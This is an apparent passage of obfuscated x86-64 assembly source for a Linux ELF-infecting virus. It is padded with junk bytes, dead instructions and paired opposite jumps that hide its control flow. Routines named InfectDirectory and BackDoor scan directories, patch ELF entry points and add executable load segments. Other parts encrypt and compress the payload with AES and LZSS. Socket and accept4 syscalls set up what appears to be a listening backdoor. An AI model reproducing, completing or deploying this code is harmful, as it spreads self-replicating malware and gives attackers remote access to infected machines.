    jmp         ..@fNKReZ4hsFYo
..@gQclZ7pwHouP:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_ACCEPT4
%endif
    jl          ..@1v0QMrkHfG5z
    jge         ..@1v0QMrkHfG5z
..@Q1LJGUBTCUWH:
    push        rax
    pop         rax
    jmp         $+3
db 0xbb
    jmp         $+4
db 0x52, 0x2e
    jmp         ..@b6U6JNjTwoIa
..@jUXC8eXOk8fw:
    mov         rax, (-1)
    jb          ..@jxZ09EzqjX0r
    jae         ..@jxZ09EzqjX0r
..@GXQPVeoe6mj1:
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jmp         $+4
db 0x88, 0x33
    js          ..@2KlQsgOAlDSe
    jns         ..@2KlQsgOAlDSe
..@oKV6beU0okIO:
    jmp         ..@qISwsOb4oG5u
    jl          ..@eQp7tTbUNiLP
    jge         ..@eQp7tTbUNiLP
..@PbUpc2DdyfsO:
    movdqu      xmm1, oWORD [rsp+0xd0]
    aesenc      xmm0, xmm1
    jb          ..@kkCEEDLS7s9T
    jae         ..@kkCEEDLS7s9T
..@kGzVRxEJfBpX:
    rep         stosb
    xor         r2, r2
    xor         r3, r3
    jb          ..@ySSN91Ks0a0l
    jae         ..@ySSN91Ks0a0l
..@WodJEncz9ZHP:
    xor         rax, rax
    jmp         $+3
db 0xed
    jb          ..@SphEzlaUXEnl
    jae         ..@SphEzlaUXEnl
..@pwUjkzkmpTr7:
    cmp         QWORD m6, 0x00
    je          ..@3n6j4Wnn5Wt7
    jne         ..@3n6j4Wnn5Wt7
..@drXM5fV3s4dB:
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    jmp         $+4
db 0xaa, 0x95
    jl          ..@PJOg2WvmHTBi
    jge         ..@PJOg2WvmHTBi
..@rqGZ7OimiW3a:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    js          ..@JnZnhu50FqyZ
    jns         ..@JnZnhu50FqyZ
..@GByQId96Gu7j:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    jmp         $+3
db 0x37
    jl          ..@Ix0v1qsiLjcU
    jge         ..@Ix0v1qsiLjcU
..@3xst7oqCI3zY:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jb          ..@kv1nHEuohXT0
    jae         ..@kv1nHEuohXT0
..@EMBNqq9zFm10:
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jmp         $+3
db 0x10
    jmp         $+4
db 0xc6, 0x70
    jmp         ..@Tfk7mEdwzEdr
..@zXdD1YVuCHT0:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+5
db 0xcc, 0xb0, 0xe2
    jmp         $+4
db 0x5e, 0x11
    jl          ..@msoFHxxK2YJh
    jge         ..@msoFHxxK2YJh
..@lKl1ydDgWKlX:
    mov         BYTE [r1], '/'
    add         r1, 1
    mov         rdi, rdi
    jmp         $+4
db 0x40, 0xca
    jmp         ..@oDnhgYn9VQN2
..@c4P24cJjC39Z:
    mov         rax, SYS_WAIT4
    jmp         $+3
db 0x3f
    jb          ..@lHwVNaoh9Hqa
    jae         ..@lHwVNaoh9Hqa
..@iMLzDBEdyVIX:
    mov         rsp, rsp
    jmp         ..@r7yDdj9p1qdd
..@NAgjHpi1Vg2I:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    js          ..@MHBZefK9Zp2I
    jns         ..@MHBZefK9Zp2I
..@Olcjv1ttX16n:
    pop         rbx
    jmp         ..@9FVxAKWGk1MN
..@yngZPj8iM9bC:
    pop         r5
    jmp         $+3
db 0xbb
    jmp         $+4
db 0xda, 0xf7
    jb          ..@xE16XxBlPdQT
    jae         ..@xE16XxBlPdQT
..@w3WcQDYIEtoZ:
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    mov         r4, 0
    jmp         ..@BHt9ailRWq4V
..@ZAL8a7iRzlMf:
    mov         QWORD [r5+file.fileptr], 0x00
    js          ..@waHKhoFIHxrw
    jns         ..@waHKhoFIHxrw
..@40vdlFC4IFNR:
    mov         DWORD [r5+file.filefd], eax
    jmp         $+4
db 0xba, 0xbc
    jb          ..@GaAS9JcJ4Hu7
    jae         ..@GaAS9JcJ4Hu7
..@QkpseOsNR9j3:
    push        rcx
    jmp         $+3
db 0xfd
    jmp         $+5
db 0x17, 0xaf, 0xbd
    jb          ..@GfF0clfgMjD5
    jae         ..@GfF0clfgMjD5
NonBinaryFile:
    jmp         ..@JyhKSB8BSJj5
..@GbnvrlWtCQBf:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    je          ..@RC2MzAyFlmAc
    jne         ..@RC2MzAyFlmAc
..@51DxuIDNcjZ7:
%ifndef ENABLE_DEBUGGING
    mov         r2, r5
    mov         rbp, rbp
%endif
    jmp         $+3
db 0xc4
    je          ..@Y12jxhXCHgyJ
    jne         ..@Y12jxhXCHgyJ
..@zdJ6jwZ7XATV:
    call        DYNPIEValidation
    jmp         ..@K3rBWUUT5lXp
..@YH8OWnmW0VrH:
    pop         rax
    je          ..@BuzxMPol5Jk7
    jne         ..@BuzxMPol5Jk7
..@RBohGpyFFzJE:
    mov         r5, r1
    jb          ..@Itt6ww4zfBuO
    jae         ..@Itt6ww4zfBuO
..@kjAqQcZ29KqU:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+5
db 0xf1, 0x9d, 0x67
    jb          ..@O56VXgxFN73n
    jae         ..@O56VXgxFN73n
..@I13Hc30jIqM1:
    push        rax
    pop         rax
    mov         rsp, rsp
    jb          ..@d2ThjTBLfzc2
    jae         ..@d2ThjTBLfzc2
..@px27jvUkoU98:
%ifndef ENABLE_DEBUGGING
    jl          ..@msoFHxxK2YJh
    mov         r1, rax
%endif
    jmp         $+5
db 0x29, 0x98, 0x0a
    jmp         $+3
db 0x7f
    jb          ..@JtPz8Swf6sOo
    jae         ..@JtPz8Swf6sOo
..@0w1LGfxtvchn:
%ifndef ENABLE_DEBUGGING
    syscall
    sub         r2, 1
    cmp         r2b, 0x0
%endif
    jmp         $+4
db 0x6e, 0x8b
    jmp         $+4
db 0x78, 0xb2
    jmp         ..@RRDurzV4EWxK
..@3OCy12BMwpoa:
    add         r5, 1
    jmp         ..@qISwsOb4oG5u
    jl          ..@S5OqQFSC9j6O
    jge         ..@S5OqQFSC9j6O
..@k3HMe9vCmxYf:
    OFILE       [r1], 0x10000
    jmp         $+5
db 0xcb, 0xfd, 0xd4
    jl          ..@QkpseOsNR9j3
    jge         ..@QkpseOsNR9j3
..@2KlQsgOAlDSe:
    jne         ..@UMBBr2dSG8iH
    mov         rax, QWORD [rsi+rcx+bytes]
    jmp         ..@dMFEo8O4fnUB
..@tMy8p2USswmf:
    cmp         rax, 0x00
    jle         ..@zsINgtGROFAC
    mov         r5, r3
    jmp         $+5
db 0x8f, 0xbe, 0x2a
    jmp         $+3
db 0x56
    js          ..@em7bclbw3I25
    jns         ..@em7bclbw3I25
..@DG1v8OiRgBnq:
%ifndef ENABLE_DEBUGGING
    xchg        rax, rax
%endif
    jmp         $+4
db 0xfb, 0xe6
    jmp         $+3
db 0xb2
    js          ..@0w1LGfxtvchn
    jns         ..@0w1LGfxtvchn
..@f4VQ8JNtslJJ:
    or          QWORD [r1+e_h.e_entry], 1b
    js          ..@tiREhl6NM0Jp
    jns         ..@tiREhl6NM0Jp
..@bDyBgTnpy7r7:
    add         rsp, 0x100
    ret
    js          InfectDirectory
    jns         InfectDirectory
..@QwMJPXSg69lv:
    test        r2, r2
    jmp         $+3
db 0x2e
    je          ..@a8UDGpkenpRE
    jne         ..@a8UDGpkenpRE
..@aJQSAAdgSRmI:
    cmp         rdi, rsi
    jmp         $+5
db 0x42, 0x6d, 0xd9
    jl          ..@in51rVOwgEzA
    jge         ..@in51rVOwgEzA
..@s9hQ6S6u0Icy:
    pop         rax
    jmp         ..@GwSRIlO58Zlp
..@QMPk8KlWvEJX:
    movdqu      [rsi+rcx], xmm0
    add         rcx, 0x10
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    jmp         ..@EW9C9zZrjl6w
..@qoP4y0R4FTdg:
    push        rdx
    js          ..@PQbEeluPWU2V
    jns         ..@PQbEeluPWU2V
..@R5QdXwt81LDI:
    xchg        rdi, rdi
    add         r4, 1
    jmp         $+4
db 0x92, 0xfe
    jmp         $+5
db 0xc1, 0x71, 0xd4
    je          ..@jumdj2BKe2yq
    jne         ..@jumdj2BKe2yq
..@9FVxAKWGk1MN:
    xor         rdi, rdi
    xor         rdx, rdx
    jmp         $+4
db 0x6e, 0x82
    jmp         $+5
db 0x3e, 0xab, 0x6c
    jmp         $+4
db 0x4e, 0xad
    jmp         $+3
db 0x46
    jmp         ..@7HqweaW0L8hE
..@roUJuZp2q12b:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    jl          ..@0AEyiqDXegrY
    jge         ..@0AEyiqDXegrY
..@aZlrRNYe76LU:
    push        rbx
    jmp         $+3
db 0xf6
    jl          ..@fnAModRL2ytq
    jge         ..@fnAModRL2ytq
..@Ahe3hQ9T78At:
    add         eax, 0x30
    jmp         $+3
db 0xaf
    jmp         ..@7altwpA4Um7B
..@Lk619ECM6sVT:
    push        rdx
    jmp         $+5
db 0x4d, 0x79, 0x9f
    js          ..@NxzoLQa7g5zC
    jns         ..@NxzoLQa7g5zC
..@AQLDtC5oSwQv:
    sub         rsi, 1
    std
    rep         movsb
    jmp         ..@j8GUhtJcaoEo
..@Xdxki88OXk76:
%ifndef ENABLE_DEBUGGING
    cmp         rax, 0x0
%endif
    jmp         $+4
db 0x83, 0x84
    jmp         ..@px27jvUkoU98
..@veula7Jocueh:
    mov         rbx, rbx
    je          ..@ET4Z7OGbbrTS
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    jmp         ..@F4xFoZJ8JaTE
..@OXRxNQMouZQk:
%ifdef X86_32
    push        rdx
%endif
    jmp         $+3
db 0x55
    jl          ..@W1Q1tdJshnLC
    jge         ..@W1Q1tdJshnLC
..@nbNPRARALyJt:
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    mov         DWORD [r2], PT_LOAD
    jl          ..@ibuwVTXBPEZI
    jge         ..@ibuwVTXBPEZI
..@DsTKCpaXpKiC:
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    jmp         ..@y4uAeX2RFkyj
..@ObPTNJFa0zqD:
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    xor         r4, r4
    jmp         ..@wLbnhejwF4nt
..@iHBacJ8AP9RI:
    ret
    jb          NonBinaryFile
    jae         NonBinaryFile
..@3d4fZ4RKOnG6:
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, r1
    jmp         $+3
db 0xab
    jmp         $+3
db 0xf4
    jb          ..@LzJwZFGwnD0j
    jae         ..@LzJwZFGwnD0j
..@KVK92fFDulaD:
    mov         rax, SYS_MUNMAP
    je          ..@WnVL3S6U5pAK
    jne         ..@WnVL3S6U5pAK
..@MyRYWtpvcv0l:
    mov         r1, [rsp+_NBF_OFF.file]
    jl          ..@nMOyjXjDdZyK
    jge         ..@nMOyjXjDdZyK
..@9EpdjpiU4hzV:
    mov         r1, QWORD [r5+file.fileptr]
    mov         rdi, rdi
    jb          ..@eEoHNbpM3HjC
    jae         ..@eEoHNbpM3HjC
..@hWWPCzhBrzWY:
    add         rsp, _INFFILE_OFF_size
    jmp         $+5
db 0x99, 0x9f, 0x71
    jb          ..@yQ36zJaen430
    jae         ..@yQ36zJaen430
..@ibuwVTXBPEZI:
    mov         QWORD [r1+e_h.e_entry], r3
    jl          ..@f4VQ8JNtslJJ
    jge         ..@f4VQ8JNtslJJ
..@88O29IAoX2IU:
    xor         rax, rax
    xchg        rdx, rdx
    mov         dx, WORD [rsp] 
    je          ..@mBC6tfjiVbIz
    jne         ..@mBC6tfjiVbIz
..@7COWA3gSoOwC:
    xor         rdx, rdx
    jmp         ..@MXHuiC5qmms3
..@usGhED6gcYol:
    add         rsp, _PAYLOAD_OFF_size
    push        rdx
    jl          ..@Cg2bze3rWJZk
    jge         ..@Cg2bze3rWJZk
..@sOCOAbIqJbgp:
    xchg        rdi, rdi
    jmp         ..@nThnUW0y98dV
..@XhswCnl42Lm2:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_SOCKET
%endif
    jmp         ..@URN7IXGRwLKR
..@zopmGJR2bwHl:
    push        r5
    jmp         $+3
db 0xc5
    js          ..@je9N15gYPeCs
    jns         ..@je9N15gYPeCs
..@Es0Z0aHd4OqC:
    add         rdi, key-_start
    lea         rsi, [rsp+_PAYLOAD_OFF.key]
    xchg        rax, rax
    jmp         ..@4UmCsZqMpHZM
..@TglUL4c2hHAB:
    push        rdx
    jmp         $+4
db 0x64, 0xd5
    js          ..@KLnyMF4nvnFG
    jns         ..@KLnyMF4nvnFG
..@8BphEbjsfo0D:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    jmp         $+3
db 0x99
    jmp         $+4
db 0xaf, 0xc3
    jmp         $+5
db 0xd6, 0x87, 0x62
    jb          ..@DVaYPeCIMVyK
    jae         ..@DVaYPeCIMVyK
..@4DyK753N01H2:
    add         rdi, _signature.index-_signature.start
    jl          ..@q9kBqKe1q1aH
    jge         ..@q9kBqKe1q1aH
..@VzdDZ76pqV2z:
    call        Strcpy
    xchg        rsp, rsp
    jmp         $+3
db 0x5e
    jb          ..@lKl1ydDgWKlX
    jae         ..@lKl1ydDgWKlX
..@to5fzznV41RZ:
    xchg        rdx, rdx
    mov         r1, m6
    add         r1, _signature-_start
    jmp         ..@w3WcQDYIEtoZ
..@mBnhW86o2P4t:
%ifndef ENABLE_DEBUGGING
    xchg        rbx, rbx
    jl          ..@msoFHxxK2YJh
    mov         r1, rax
%endif
    jmp         ..@NII3PbsHdo91
..@Ld3tpocpBLy5:
    pop         r3
    jmp         $+5
db 0xb7, 0x71, 0xaa
    jmp         $+4
db 0x1c, 0xe3
    jb          ..@GSTf4kd6RCsr
    jae         ..@GSTf4kd6RCsr
..@FW7Soq0mgH7g:
    xchg        rsi, rsi
    push        r3
    sub         rsp, _KEYGEN_OFF_size
    jmp         $+5
db 0x60, 0xb2, 0xbf
    jmp         ..@7eb9Acidp0Td
..@eAZ7kuPA6EXL:
    sub         rsp, _VADDR_OFF_size
    jmp         ..@fajKYMGyfx52
..@O4hGg3UTMaNG:
    push        rbx
    pop         rbx
    jmp         $+3
db 0xbc
    jb          ..@SVG2CQYnOsIX
    jae         ..@SVG2CQYnOsIX
..@jnmSchPsCWIy:
    xor         r1, r1
    jmp         $+5
db 0x3f, 0xef, 0x7e
    jmp         $+4
db 0xf8, 0xe3
    jl          ..@LJkzYsdfUEmf
    jge         ..@LJkzYsdfUEmf
..@GjERNERShRqe:
    xor         r1, r1
    jmp         $+3
db 0x5b
    js          ..@BWM4BQxPABoV
    jns         ..@BWM4BQxPABoV
..@WEILTqfKZtDO:
    mov         eax, 0x00
    rep         stosb
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    je          ..@DbPQwzbtoPu1
    jne         ..@DbPQwzbtoPu1
..@9DpYq7tN8Uyw:
%ifdef X86_64
    xor         r9, r9
%endif
    jl          ..@JuEncGkcfPho
    jge         ..@JuEncGkcfPho
..@AdpJudself7O:
    pop         rcx
    jmp         $+3
db 0xb3
    jmp         $+4
db 0x1f, 0xb2
    jl          ..@C2blMqPGPlM1
    jge         ..@C2blMqPGPlM1
..@knv6fBdqYynh:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    xor         rax, rax
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    jb          ..@mNBihSnPDgWq
    jae         ..@mNBihSnPDgWq
..@rDDjyowVZQoc:
    CFILE       DWORD [r5+file.filefd]
    mov         rcx, rcx
    jmp         $+5
db 0x8c, 0xdb, 0x73
    je          ..@ss4viDFdQ7Zv
    jne         ..@ss4viDFdQ7Zv
..@Eenpk4mT6Zu1:
    jl          ..@mBC6tfjiVbIz
    jmp         ..@yGP7k9is8nhk
..@KjlO1FxFuj5e:
    ret
    jmp         $+5
db 0xae, 0xf4, 0x34
    jmp         $+5
db 0x33, 0x60, 0x25
    jb          IsNum
    jae         IsNum
..@I8dHEWAHAYtL:
    mov         QWORD [r5+file.fileptr], rax
    mov         QWORD [r5+file.filesize], r3
    xchg        rax, rax
    jmp         $+4
db 0x74, 0xb7
    je          ..@YKuzki6SJEhz
    jne         ..@YKuzki6SJEhz
..@twNPcSBVKinp:
    mov         r2, [rsp+_PROC_OFF.dirname]
    call        Strcpy
    je          ..@PHu6aIaTSpAX
    jne         ..@PHu6aIaTSpAX
..@E2suJMaLkztu:
    mov         rbp, rbp
    jmp         $+4
db 0x03, 0x22
    jl          ..@5Imih3iCOl8e
    jge         ..@5Imih3iCOl8e
..@Q46q0xZRuPqV:
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    sub         r1, r4
    call        MemMove
    jl          ..@7NfiAzfUh7jU
    jge         ..@7NfiAzfUh7jU
..@oljFh73q1ABo:
    mov         m7, rdi
    add         m7, rax
    jmp         ..@26lCrsuLh4IL
..@ZadmL0lbLgJj:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    xor         r1, r1
    js          ..@ilobPccyCFiV
    jns         ..@ilobPccyCFiV
..@qFrxvCCxA7av:
    mov         rbx, rbx
    xor         r2, r2
    jmp         $+3
db 0xa4
    js          ..@Mkxe0L3EtCg2
    jns         ..@Mkxe0L3EtCg2
..@bs1cZgInt9ab:
    mov         rbx, rbx
    jmp         ..@mbHxbAQJRKJF
..@OMpy3N5bM7IJ:
%ifndef ENABLE_DEBUGGING
    pop         rsi
    xor         r3, r3
    xor         r4, r4
%endif
    jmp         $+5
db 0x72, 0xe5, 0xaf
    jb          ..@noT4SQLlpoaz
    jae         ..@noT4SQLlpoaz
..@oy5X6QbhPIKo:
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    jb          ..@aQDgTPM05aMb
    jae         ..@aQDgTPM05aMb
..@dqk1UnGRdEIB:
    mov         ax, WORD [r1]
    jmp         ..@LYjClxqj0XjU
..@jxZ09EzqjX0r:
    pop         r5
    pop         r4
    jmp         ..@2AvP8mXpi6pp
..@dHIawrBLtFBt:
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jmp         $+5
db 0xe6, 0x05, 0x7b
    jmp         $+3
db 0xea
    jb          ..@AY7rgoLJ3br0
    jae         ..@AY7rgoLJ3br0
..@eDi3V1G9C5th:
    jge         ..@gdbsc0fWsixU
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    xor         rax, rax
    jmp         $+3
db 0xa4
    jmp         ..@Yxls3RklPOOV
..@em7bclbw3I25:
    mov         r3, rax
    jmp         ..@kkXMSNLLkJRZ
..@gc2hv4lfnI0F:
    cmp         r4, 0x00
    jmp         ..@fLYPcxwuru5h
..@DYPZRSSfbR3u:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    mov         rbp, rbp
    jmp         ..@4DyK753N01H2
..@ZEZxcxSFYmgb:
    pop         rdx
    mov         edx, 100000000b
    push        rdi
    jmp         $+5
db 0xe8, 0x4f, 0x3f
    jmp         $+3
db 0xb3
    jb          ..@uZHF8z3gw1Px
    jae         ..@uZHF8z3gw1Px
IsELFComplete:
    jmp         ..@fDfnUmoqSIYF
..@eBtfz4C8joqG:
    jle         ..@Q9IIcuATVTeU
    jmp         $+5
db 0x64, 0x30, 0xc3
    jb          ..@C49l690wuUer
    jae         ..@C49l690wuUer
..@HomwKn3ca0Kg:
    mov         r2w, WORD [r5+e_h.e_shnum]
    jb          ..@TI0vdDj1dsQq
    jae         ..@TI0vdDj1dsQq
..@r7yDdj9p1qdd:
    push        rbx
    jmp         $+3
db 0xd0
    jmp         ..@gCZLapfGByFO
..@mdNNrrrWy3ef:
    pop         r4
    jb          ..@AGwGHTilh26h
    jae         ..@AGwGHTilh26h
..@mNBihSnPDgWq:
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    push        rax
    jmp         $+3
db 0xa2
    jmp         $+5
db 0x8d, 0x55, 0x77
    jb          ..@s9hQ6S6u0Icy
    jae         ..@s9hQ6S6u0Icy
..@RL4btznYZWao:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r3, r2
    jmp         $+5
db 0x42, 0x46, 0xac
    jmp         $+3
db 0xb3
    jb          ..@RV1EfHo1X6Pc
    jae         ..@RV1EfHo1X6Pc
..@ET4Z7OGbbrTS:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jl          ..@amJk22FETKlb
    jge         ..@amJk22FETKlb
..@tvSfFGmnQeCE:
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        IsNum
    test        eax, eax
    jb          ..@d2nImbnmmwuN
    jae         ..@d2nImbnmmwuN
..@iUjz4NpprUdL:
    jmp         ..@Y61Jt6wG3DVA
    js          ..@zdJ6jwZ7XATV
    jns         ..@zdJ6jwZ7XATV
..@TGTFXbBt369U:
    mov         rsi, rsi
    xor         rcx, rcx
    mov         rdi, m6
    jmp         $+5
db 0x03, 0x87, 0x7e
    js          ..@Es0Z0aHd4OqC
    jns         ..@Es0Z0aHd4OqC
..@5V0QzROoPGzC:
    mov         r2, 1
    jl          ..@49214h1kuf6v
    jge         ..@49214h1kuf6v
..@xCJIP2FIxagZ:
    VAR         packed, status
    jmp         ..@2r2MYoAv542e
..@enjmfRxuwAzg:
    jne         ..@UjYHNYXphJVA
    jmp         $+5
db 0x6c, 0xea, 0xf1
    jmp         ..@tnTbfddOLDuQ
..@Y61Jt6wG3DVA:
    xor         rax, rax
    jmp         $+4
db 0x2b, 0x1e
    jmp         ..@iHBacJ8AP9RI
..@wLbnhejwF4nt:
    mov         rcx, rcx
    push        rdi
    pop         rdi
    jmp         $+3
db 0x37
    jmp         ..@pVbganjwP8Pk
..@7Z7caBPjOsfZ:
    cmp         ax, LOOKAHEAD_LENGTH
    cmovl       dx, ax
    jmp         $+4
db 0xa3, 0x1e
    jmp         ..@C9nxA7KHO9B0
MapFile:
    jmp         ..@r9fSxn3KvO9o
..@1ipYddyUlCuA:
    call        MemMove
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    push        rcx
    jmp         ..@W6EyXucwiPhv
..@tS0XXJsSpm20:
%ifndef ENABLE_DEBUGGING
    push        rbx
    pop         rbx
%endif
    jmp         $+5
db 0x55, 0xd3, 0x17
    js          BackDoor
    jns         BackDoor
..@4V4R71E7xh0h:
    jne         ..@TgoJtM7vs9Nz
    mov         rbp, rbp
    je          ..@wBNCZCbCXwc9
    jne         ..@wBNCZCbCXwc9
..@RwsPdkZCcmKx:
    mov         r2, m6
    jmp         $+5
db 0x2a, 0x70, 0xb8
    jmp         ..@KkUFpYZowhZd
..@hc8FiVpaVd6L:
    je          ..@jUXC8eXOk8fw
    jb          ..@I8dHEWAHAYtL
    jae         ..@I8dHEWAHAYtL
..@ZGKhzXTEjP5f:
    mov         r1, rsp
    jl          ..@2nSNYKY7bqmY
    jge         ..@2nSNYKY7bqmY
..@5VhQxP6vS3nM:
    cmp         rax, (-1)
    je          ..@usGhED6gcYol
    jmp         $+3
db 0x6f
    jmp         ..@xeyIDO3W09jU
..@jCXsKXNMusu1:
%ifdef X86_64
    xchg        rsp, rsp
    xor         rax, rax
    xor         rdi, rdi
%endif
    jmp         $+4
db 0x52, 0xd5
    js          ..@iTjqSmEKurhR
    jns         ..@iTjqSmEKurhR
..@IPRQV3vUSp8F:
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    jmp         $+4
db 0xdc, 0xa9
    jmp         $+5
db 0x01, 0x14, 0x22
    jmp         ..@OYjCGgjcRB5x
..@WuUvk9SxGFsQ:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    mov         rbp, rbp
    jb          ..@NAgjHpi1Vg2I
    jae         ..@NAgjHpi1Vg2I
..@8p5v9m76o2EQ:
    xchg        rsp, rsp
    jmp         ..@XGpnylUGH4T1
..@A5nlAKvmWLEp:
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    mov         rbx, rbx
    jmp         $+5
db 0xfb, 0x30, 0x2f
    jl          ..@HaqAzbobmvH6
    jge         ..@HaqAzbobmvH6
..@kkXMSNLLkJRZ:
    and         r5, (PAGE_SIZE-1)
    add         r3, r5
    mov         r4, r3
    jb          ..@KtzAqjqUVv38
    jae         ..@KtzAqjqUVv38
..@shJg0z8tKTWO:
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    jl          ..@8BphEbjsfo0D
    jge         ..@8BphEbjsfo0D
..@2qRw1RasC4Rr:
    mov         BYTE [r1], '/'
    jmp         ..@f4FyH8PxVwSx
..@ZK0eVJkQAswv:
    push        r4
    jmp         $+3
db 0x64
    jmp         $+3
db 0x20
    je          ..@zopmGJR2bwHl
    jne         ..@zopmGJR2bwHl
..@AWzYC0817nT5:
    xchg        rdi, rdi
    mov         rbp, rbp
    jmp         ..@ZWNSsWETpqJE
..@VRrMwrLhB4i8:
    mov         rbp, rbp
    js          ..@fvmBDWi2hThL
    jns         ..@fvmBDWi2hThL
..@iGt2oOtc4KdO:
    jge         ..@eyJZt2aKc7ZC
    jmp         ..@bs1cZgInt9ab
..@z5F52e2ZqIsK:
    mov         r3, _decrypt-_virus
    jb          ..@8WehPr3aRS1N
    jae         ..@8WehPr3aRS1N
..@BbVg62MZRoi6:
    xchg        rax, rax
    jmp         $+3
db 0x1b
    jl          ..@EGLKqejjC9Hg
    jge         ..@EGLKqejjC9Hg
..@Dusd5vaRc4Qs:
    cmp         eax, 0x03
    jl          ..@DgZ3ibeHRW29
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    jl          ..@55NVEJPM7lul
    jge         ..@55NVEJPM7lul
..@TDKsqjJBlrvx:
    push        rcx
    pop         rcx
    je          ..@FW7Soq0mgH7g
    jne         ..@FW7Soq0mgH7g
..@z36gzAhzIcNO:
    push        r1
    push        rax
    jb          ..@NuE303sJqYN6
    jae         ..@NuE303sJqYN6
..@BaFzHhvQEha2:
    cmp         BYTE [r5], DT_DIR
    jne         ..@1MfVbZBJ9tkB
    jmp         $+4
db 0xa7, 0x68
    jb          ..@CL39mbKv9ZvO
    jae         ..@CL39mbKv9ZvO
..@VjG1kRbaj1UZ:
    mov         r1, r5
    jmp         $+5
db 0xbe, 0x7c, 0x96
    jb          ..@P3dBHi5TAj0n
    jae         ..@P3dBHi5TAj0n
..@LWLpHKBFS66Y:
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    push        rdi
    pop         rdi
    jmp         $+5
db 0x10, 0xd1, 0xac
    jb          ..@AJCznaqHBtG7
    jae         ..@AJCznaqHBtG7
..@0EjLHg5koSRq:
    mov         rax, 1
    push        rax
    jmp         $+3
db 0x04
    jl          ..@YH8OWnmW0VrH
    jge         ..@YH8OWnmW0VrH
..@eQp7tTbUNiLP:
    xchg        rdi, rdi
    jmp         $+5
db 0x22, 0xef, 0xa1
    jmp         ..@7Wf05n5s5ayh
..@wMFhQmcXmA4O:
    jmp         ..@SphEzlaUXEnl
    push        rbx
    pop         rbx
    jmp         $+4
db 0xc7, 0xf3
    jmp         $+5
db 0x63, 0x32, 0x97
    js          ..@WodJEncz9ZHP
    jns         ..@WodJEncz9ZHP
..@NII3PbsHdo91:
%ifndef ENABLE_DEBUGGING
    push        QWORD 0x0
    push        WORD 0x5c11
    push        WORD 0x02
%endif
    jmp         ..@V3rbJmx5xkkT
..@1v0QMrkHfG5z:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+3
db 0x3f
    jmp         $+3
db 0x13
    jmp         ..@Xdxki88OXk76
..@yQ36zJaen430:
    ret
    jb          FileValidation
    jae         FileValidation
..@UgDSQntpLZa0:
    push        rax
    jl          ..@J7OgRdvOD5D2
    jge         ..@J7OgRdvOD5D2
..@kLMC9l4UaZwa:
    test        al, al
    jnz         ..@Y61Jt6wG3DVA
    mov         rax, 1
    jmp         $+3
db 0xd5
    js          ..@qH9D6tpiL58c
    jns         ..@qH9D6tpiL58c
..@UdnaD6EvigEF:
    call_vsp    Strncmp
    test        ax, ax
    push        rax
    jmp         $+5
db 0x6e, 0xf7, 0x5b
    jl          ..@kDzq8wkcCnN1
    jge         ..@kDzq8wkcCnN1
..@xYGeT4A0bkbL:
%ifdef X86_32
    xor         eax, eax
%endif
    jmp         $+3
db 0xb3
    je          ..@cfphLxO3WkK3
    jne         ..@cfphLxO3WkK3
..@eD12VSBe3hJ8:
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    jmp         $+5
db 0xfa, 0xd2, 0x8f
    jl          ..@hfh8UPEgfXyT
    jge         ..@hfh8UPEgfXyT
..@xro1DcDF6zPy:
    mov         rdi, m7
    mov         ecx, PADDING
    jmp         $+4
db 0xaa, 0x6a
    jl          ..@WEILTqfKZtDO
    jge         ..@WEILTqfKZtDO
..@mp5lxM2kSc70:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jb          ..@c9NmmrmZeqIb
    jae         ..@c9NmmrmZeqIb
..@aj27LNE1fx5P:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         $+3
db 0xa8
    jb          ..@tvJ8lwAMVXWi
    jae         ..@tvJ8lwAMVXWi
